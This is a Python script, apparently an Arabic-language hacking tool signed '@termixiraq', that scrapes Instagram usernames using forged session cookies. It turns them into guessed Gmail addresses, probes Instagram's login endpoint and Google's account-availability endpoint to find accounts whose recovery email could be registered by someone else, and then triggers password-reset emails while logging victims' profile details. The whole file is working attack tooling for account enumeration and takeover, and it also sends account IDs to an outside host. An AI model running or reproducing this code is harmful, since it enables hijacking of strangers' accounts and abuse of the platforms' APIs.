import requests
import secrets
from faker import Faker 
import random
import time
import json
import threading
import os
pas=111
passw=input('enter your pas')
if passw==pas:
   print('good')
else:
   print('error')
   exit()
def h():
   
   #sessi='318506585%3ACVqw0bbsyimqSY%3A7%3AAYc_Nfk3SCTLr1vnJW9ueTXVuaOVojaDNP-ikecVHA'
   while True:
    #hh = [
    #"ar_AA", "ar_AE", "ar_BH", "ar_EG", "ar_JO", "ar_PS", "ar_SA", "az_AZ",
    #"bg_BG", "bn_BD", "bs_BA", "cs_CZ", "da_DK", "de", "de_AT", "de_CH", "de_DE",
    #"dk_DK", "el_CY", "el_GR", "en", "en_AU", "en_CA", "en_GB", "en_IE", "en_IN",
    #"en_NZ", "en_PH", "en_TH", "en_US", "es", "es_AR", "es_CA", "es_CL", "es_CO",
    #"es_ES", "es_MX", "et_EE", "fa_IR", "fi_FI", "fil_PH", "fr_BE", "fr_CA", "fr_CH",
    #"fr_FR", "ga_IE", "he_IL", "hi_IN", "hr_HR", "hu_HU", "hy_AM", "id_ID",
    #"it_CH", "it_IT", "ja_JP", "ka_GE", "ko_KR", "la", "lb_LU", "lt_LT", "lv_LV",
    #"mt_MT", "ne_NP", "nl_BE", "nl_NL", "no_NO", "or_IN", "pl_PL", "pt_BR", "pt_PT",
    #"ro_RO", "ru_RU", "sk_SK", "sl_SI", "sq_AL", "sv_SE", "ta_IN", "th", "th_TH",
    #"tl_PH", "tr_TR", "tw_GH", "uk_UA", "vi_VN", "zh_CN", "zh_TW", "zu_ZA"
   #]
    #gg=random.choice(hh)
    faker = Faker()
    cookies_value=faker.uuid4()
    cookies_string=f"{cookies_value}"
    #mid=str("".join(random.choice('ZNS8TAABAAGIluu5GdRKW7-kOo4vZIwIGQALAAFJh0hs0zugnqEWswdVZNOoBQALAAGNtLzGeFVzHXDZTR_3')for i in range(28)))
    mid = secrets.token_hex(28)
    #csr=str("".join(random.choice('BgqHBezVdVLIwiiK2vnQoMeHfwDnEDdy4ev2UhLwIvaMMmcTnIPLlnYe9eKIrk6h')for i in range(32)))
    csrf_token = secrets.token_hex(32)
    #datr=str("".join(random.choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890')for i in range(24)))
    #tok=str("".join(random.choice('BgqHBezVdVLIwiiK2vnQoMeHfwDnEDdy4ev2UhLwIvaMMmcTnIPLlnYe9eKIrk6hIchbyeD2EMfxlXtEidhVb473sX2nACJi')for i in range(32)))
    #ce="".join(random.choice('1234567890')for i in range(3))
    #nn="".join(random.choice('1234567890')for i in range(2))
    user1='3185065856117232390916041093751954736743761365466232234569147861383944408'
    kk = random.randint(10,11)
    user2="".join(random.choice(user1)for i in range(kk))
    yy='3ACVqw0bbsyimqSY%3A7%3AAYc_Nfk3SCTLr1vnJW9ueTXVuaOVojaDNP-ikecVHA%3AwsGfd6prEwVhQi%3A9%3AAYc2pc3P-nMx-khlBp4mOvkT39Zj7G6UXWn3CSXKag3Av36lq83bB4QMSG%3A28%3AAYeb3SKZK1ftXI_IOeqbkTLg1N_ve1vxmLkQ2qc05A3AyvYh8ztbg9qPOl%3A5%3AAYetGkds5jo18ck0uZW3I_tmj1dqk3Q9YRUrSaIYsQ3AOKLDLNPsHYGTJl%3A0%3AAYeYbOklyVCesUBg0pE2scMTw8RgelDdx4eVIQ_2hQ3AZvWuI0EbY8PXmw%3A2%3AAYexLLuc7bASBuyVWaAZuEy6qmu0f8XAnkZkgxyrIw3A3hbzW3nBjg5gXG%3A25%3AAYcyM6J_IhqRi2bFV1II17_FkjtAMjB0KXQ5Q0Khvw3AsyVlIj4ZDzyRPO%3A5%3AAYfGLAn2jh_fwDsnJupuDgVG2BBWgWiyjdH5fTi5Fw3A0zNy29n3aeW9ZI%3A16%3AAYe5NkWjqegZ_pMAlrXO_zbFTfnYdswA3I-CnKwd4w3ANhynbbv9oTPItn%3A11%3AAYfHL92Yand7PNHZfGZwHE3_PF89j5Rk0cxgTfrU8g3AOrDDBg3KyjB4Z4%3A27%3AAYcEUTo5aCtRrJSyN72i58IY5hJQLXQ_A8_QBuZPWQ3AvJYrEgtUCt5sgo%3A7%3AAYeFzP4zJ_5DPtyvbtmLARpmKt-8_2a4a0D07KNqUA3APjfLNuNjfj7z6u%3A25%3AAYfPNAz2A6IGXdKjqNg-Ge7NbJ1Y_ep6njcF2NlK5w3A2WIqaZiNrLBelY%3A27%3AAYfpoMf8AULuX7BmZnbAlFbKbtKz5yIRAM1QRCByWQ3AKg6IycgpKB3eVJ%3A3%3AAYfgX0TQlpmYSR6ba0ZpTlqa_q0usCySLjChjll8HA3Ary8aErh01bE1xe%3A6%3AAYc4UV_sJxv6VUev-U695nwzv_wWP49-z_x9pV7eTQ'
    us="".join(random.choice(yy)for i in range(16))
    vcc= '%'
    loo='3A28'
    zxe='%'
    ui='3AAY'
    nbp= secrets.token_hex(40)
    user3=user2 + us + vcc + loo + zxe + ui + nbp
    #sessionid = "{}".format(str(secrets.token_hex(16)))
    dse='6104588354061236199928'
    ds = ''.join(random.choice(dse)for i in range(11))
    #use = faker.user_name()
    #name = names.get_first_name(use)
    agent=faker.user_agent()
    nm = int("".join(random.choice('6789')for i in range(1)))
    vm = str("".join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnm')for i in range(nm)))
    #rndo=random.randint(5,30) 
    #usernamee="".join(random.choice(string.ascii_letters)for _ in range(rndo))
    ur="".join(random.choice('760722997943966932987333502215')for i in range(15)) 
    url = f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&include_reel=true&query={vm}&rank_token=0.{ur}&search_surface=web_top_search'
    headers={
        'x-requested-with': 'XMLHttpRequest',
        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
        'x-ig-app-id': '936619743392459',
        'x-csrftoken': csrf_token,
        'x-asbd-id': '129477',
        'user-agent': agent,
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'referer': 'https://www.instagram.com/explore/search/',
        'cookie': f'ig_nrcb=1; mid={mid}ig_did={cookies_string}; fbm_124024574287414=base_domain=.instagram.com; csrftoken={csrf_token}; ds_user_id=' + ds + '; sessionid=' + user3+ '; shbid="11206,58469446972,1714821283:01f763eacf65e1bed36db1622cd9b77becc6a504d98daec8c34aa5ac0a56f1fb1868c8d5"; shbts="1683285283,58469446972,1714821283:01f745e8a29d08be79b9205f1346561b9309ae519614d4be609d15f378b223db4f2ed2ed";fbsr_124024574287414=751m6-int0GsxPgOW-dXPvwvXw2f88ZeCsp5F6qBtvM.eyJ1c2VyX2lkIjoiMTAwMDU4NTYyOTc3MTg4IiwiY29kZSI6IkFRQVpVWmhkZ3BEMFdpLVIydWhDRjFQanU1djZuLWhEejJoTzJXVFMwd0o3emhZa0xMTTdlMkl0b296Z3FxM2hPQ1NrX1dEMjE1LWVWbU5Cbi1CNEN3VVhZbnZ2dXdUZ3F2djlTX1pCWHBCb0RDb2VrdVhRRVptalJVWFlUSzhJTU4tb2VVMWZnSDNHX0NEWkRsdG9INmRlUUxTNTFDc0xvREJkTGJvOXg1eGw2ZXQwNVVMYmJYZEJaLUlyYkQ5bm1pVTNac0tNdEtidXd3RlVoQ2xucDBFNFFWZUJ6MVhRUzRFOWMzUEI2Z1Bya3FPZFdBaUx6S19IaEpFRmhnTFA3aXJEUGxZWGF1cnZ3aFZVWGNudTVoMGxGVG1pVzZmS1R5dURuU0lMY0lQNnBfOWtfaU00SzhGMU1rNk1vYnp2SU5rTGNBRGRrVkhCZHJfbnd3TTBGamNTIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUZmVmVIa0plU0lSVDliN0V4dWpEZFc4VnhGVUFVUzk5cWxaQUNqbU9MVzZFUTduQXh0NEdZcUtNMm45MXhNb25tWkNRNDluSHFDTFdGMHJFZzBsYjFWNUNUNnNwR3JsNVVLdGV0Y25TdmcxUnFFWW1aQkJtSWVpMllsZlF2SDI4Tkhyc1daQkhIeml1UlJLQVY1MWQwUFlNVVVqQVhrZVBxSjNkeEhocTRhRlBaQjU3V1N3WkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4Mzg2NDI2MX0; rur="CLN,507398752,1715400273:01f73de76b00543acf22a6a3c16981e476c7d4fdee12013a4bf211e98db600142455ea04"',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'accept': '*/*'
        }
    re =requests.get(url,headers=headers).json()
    q=0
    try:
        while True:
            q+=1     
            user=re['users'][q]['user']['username']+'@gmail.com'
            print(f'{X}UserName :-> {user}')
            with open("INSTAGRAM_LIST.V3.txt","a")as no:
                no.write(user+'\n')
    except:
        h()

def chh():
   file = open("INSTAGRAM_LIST.V3.txt","r").read().splitlines()
   for email in file:
      faker = Faker()
      fak = faker.user_agent()
      csrf = secrets.token_hex(32)
      mmidd=secrets.token_hex(27)
      ig_did=secrets.token_hex(36)
      datrr=secrets.token_hex(24)
      app=''.join(random.choice('936619743392459')for i in range(15))
      ajax=''.join(random.choice('1008613588')for i in range(9))
      url = ('https://www.instagram.com/api/v1/web/accounts/login/ajax/');headers = {
    'Accept':'*/*',
    'Accept-Encoding':'gzip, deflate, br',
    'Accept-Language':'ar,en-US;q=0.9,en;q=0.8,pt;q=0.7',
    'Content-Length':'314',
    'Content-Type':'application/x-www-form-urlencoded',
    'Cookie':f'mid={mmidd}; ig_did={ig_did}; ig_nrcb=1; datr={datrr}; shbid="5944\054318506585\0541726040435:01f71303fa8fb032ffce225755fba3a38e70eb0b10e1d85e216fd60b454ead8dd5ee184d"; shbts="1694504435\054318506585\0541726040435:01f75ddc4c2ae8985e2a798d964bf1a3ca59685614688045b4358b7873ea9a6068dd77f1"; csrftoken={csrf}',
    'Dpr':'1',
    'Origin':'https://www.instagram.com',
    'Referer':'https://www.instagram.com/',
    'Sec-Ch-Prefers-Color-Scheme':'light',
    'Sec-Ch-Ua':'"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'Sec-Ch-Ua-Full-Version-List':'"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"',
    'Sec-Ch-Ua-Mobile':'?0',
    'Sec-Ch-Ua-Model':'""',
    'Sec-Ch-Ua-Platform':'"Windows"',
    'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
    'Sec-Fetch-Dest':'empty',
    'Sec-Fetch-Mode':'cors',
    'Sec-Fetch-Site':'same-origin',
    'User-Agent':fak,
    'Viewport-Width':'483',
    'X-Asbd-Id':'129477',
    'X-Csrftoken':csrf,
    'X-Ig-App-Id':app,
    'X-Ig-Www-Claim':'0',
    'X-Instagram-Ajax':ajax,
    'X-Requested-With':'XMLHttpRequest',
    };tim = str(time.time()).split('.')[0];data = {
    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:tytyjtf',
    'optIntoOneTap': 'false',
    'queryParams': '{}',
    'trustedDeviceRecords': '{}',
    'username': email
    };re = requests.post(url,headers=headers,data=data)
      if ('"user":true,' and '"authenticated":false,') in re.text:
         print(f'Done InstaGram : {email}')
         url = 'https://android.clients.google.com/setup/checkavail'
         h = {
'Content-Length':'98',
'Content-Type':'text/plain; charset=UTF-8',
'Host':'android.clients.google.com',
'Connection':'Keep-Alive',
'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
}
         d = json.dumps({
'username':email,
'version':'3',
'firstName':'AbaLahb',
'lastName':'AbuJahl'
})
         res = requests.post(url,data=d,headers=h)
         if res.json()['status'] == 'SUCCESS':
            print(f' Done Gmail : {email}')
            username=email.split('@gmail.com')[0]
            headers={
                'Accept':'*/*',
                'Accept-Encoding':'gzip, deflate, br',
                'Accept-Language':'ar,en-US;q=0.9,en;q=0.8',
                'Cookie':'csrftoken=IchbyeD2EMfxlXtEidhVb473sX2nACJi; mid=ZMexfQALAAGt5vpo-vofNvm6berX; ig_did=60ACBB13-D599-407C-82A8-89F0ACCD5C26; ig_nrcb=1; datr=x83MZBLzuED-nRpgcIfvN5cA',
                'Referer':'https://www.instagram.com/gzik/',
                'Sec-Ch-Prefers-Color-Scheme':'light',
                'Sec-Ch-Ua':'"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'Sec-Ch-Ua-Full-Version-List':'"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.170", "Chromium";v="115.0.5790.170"',
                'Sec-Ch-Ua-Mobile':'?0',
                'Sec-Ch-Ua-Platform':'"Windows"',
                'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
                'Sec-Fetch-Dest':'empty',
                'Sec-Fetch-Mode':'cors',
                'Sec-Fetch-Site':'same-origin',
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'Viewport-Width':'454',
                'X-Asbd-Id':'129477',
                'X-Csrftoken':'IchbyeD2EMfxlXtEidhVb473sX2nACJi',
                'X-Ig-App-Id':'936619743392459',
                'X-Ig-Www-Claim':'0',
                'X-Requested-With':'XMLHttpRequest',
                }
            data={
                'username': username,
                }
            try:
                req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}',headers=headers,data=data).json()
                fullname=req['data']['user']['full_name']
                followers=req['data']['user']['edge_followed_by']['count']
                following=req['data']['user']['edge_follow']['count']
                bio=req['data']['user']['biography']
                post=req['data']['user']['edge_owner_to_timeline_media']['count']
                id=req['data']['user']['id']
                zp=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()
                date=zp['date']
                head= {
                "accept": "*/*",
                "accept-language": "ar-AE,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
                "sec-ch-ua-full-version-list": "\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5615.137\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "viewport-width": "412",
                "x-asbd-id": "198387",
                "x-csrftoken": "nVW5MosXQoEr1Rv1Nc4qraggjTdU5pss",
                "x-ig-app-id": "1217981644879628",
                "x-ig-www-claim": "hmac.AR2QM86Qe5fITwAGguadrM-4LVWQ1OQc5RTpaUp_PHZQAkfb",
                "x-requested-with": "XMLHttpRequest"
                }
                data = {
                'ig_sig_key_version': '4',
                "user_id":f'{id}'
                }
                hr = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=head, data=data).json()
                o=hr['obfuscated_email']
                ko=o.split('@')[0]
                first = email[0]
                last=email[email.index('@') -1]
                lo=f"""
[+] Available In Instagram 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Error Info
[+] EmAiL - {email}
[+] UseRnaMe - {username} 
[+] NamE - {fullname} 
[+] Bio - {bio} 
[+] PosT - {post} 
[+] FolLoeRs - {followers} 
[+] FolLoWiNg - {following} 
[+] Id - {id}
[+] DaTe - {date}
[+] ReSeT - {o}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Programmer - @termixiraq
                """
                llo=f"""
[+] Available In Instagram 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Good Info
[+] EmAiL - {email}
[+] UseRnaMe - {username} 
[+] NamE - {fullname} 
[+] Bio - {bio} 
[+] PosT - {post} 
[+] FolLoeRs - {followers} 
[+] FolLoWiNg - {following} 
[+] Id - {id}
[+] DaTe - {date}
[+] ReSeT - {o}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Programmer - @termixiraq
                """
                if first and last in ko:
                    print(llo)
                    with open("Done_INSTAGRAMV3.txt","a")as pr:
                        pr.write(llo+'\n')
                else:
                    print(lo)
                    with open("Done_INSTAGRAMV3.txt","a")as pr:
                        pr.write(lo+'\n')
            except:
                pass
         else:
            print(f' Error Gmail : {email}')
      elif ('"Sorry, your password was incorrect. Please double-check your password."') in re.text:
        print(f'Error InstaGram : {email}')

def home():
    po=f"""
-1- Get List Random
-2- Check List
"""
    print(po)
    try:
        vc=int(input(' Give me Number - '))
        os.system('clear')
    except:
        print(' Error Input ')
        exit()
    if vc==1:
        prox_list = []
        for i in range(5):
            t = threading.Thread(target=h)
            t.start()
            prox_list.append(t)
            time.sleep(0.01)
        h()
    elif vc==2:
        chh()   
home()
